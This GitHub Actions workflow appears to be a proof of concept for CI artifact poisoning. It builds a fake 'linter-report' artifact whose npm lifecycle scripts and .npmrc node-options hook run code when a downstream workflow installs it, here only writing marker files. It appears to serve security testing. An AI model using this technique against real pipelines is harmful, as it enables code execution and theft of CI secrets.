name: ADP3 Lint Up
on:
  workflow_dispatch:
permissions:
  contents: read
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - name: craft attacker artifact payload
        run: |
          mkdir -p payload
          cat > payload/package.json <<'JSON'
          {
            "name": "root-project-poc",
            "version": "1.0.0",
            "private": true,
            "scripts": {
              "preinstall": "echo ROOT_PREINSTALL_RAN > marker-preinstall.txt",
              "postinstall": "echo ROOT_POSTINSTALL_RAN >> marker-preinstall.txt",
              "prepare": "echo ROOT_PREPARE_RAN >> marker-preinstall.txt"
            }
          }
          JSON
          printf 'ignore-scripts=false\nforeground-scripts=true\nnode-options=--require=./nodeopt.js\n' > payload/.npmrc
          printf 'require("fs").writeFileSync("marker-nodeopt.txt","NODE_OPTIONS_RAN\\n");\n' > payload/nodeopt.js
          printf 'attacker report\n' > payload/linter-report.txt
          printf '1\n' > payload/pr-number.txt
          ls -la payload
      - uses: actions/upload-artifact@v7
        with:
          name: linter-report
          path: payload/
          include-hidden-files: true
          if-no-files-found: error
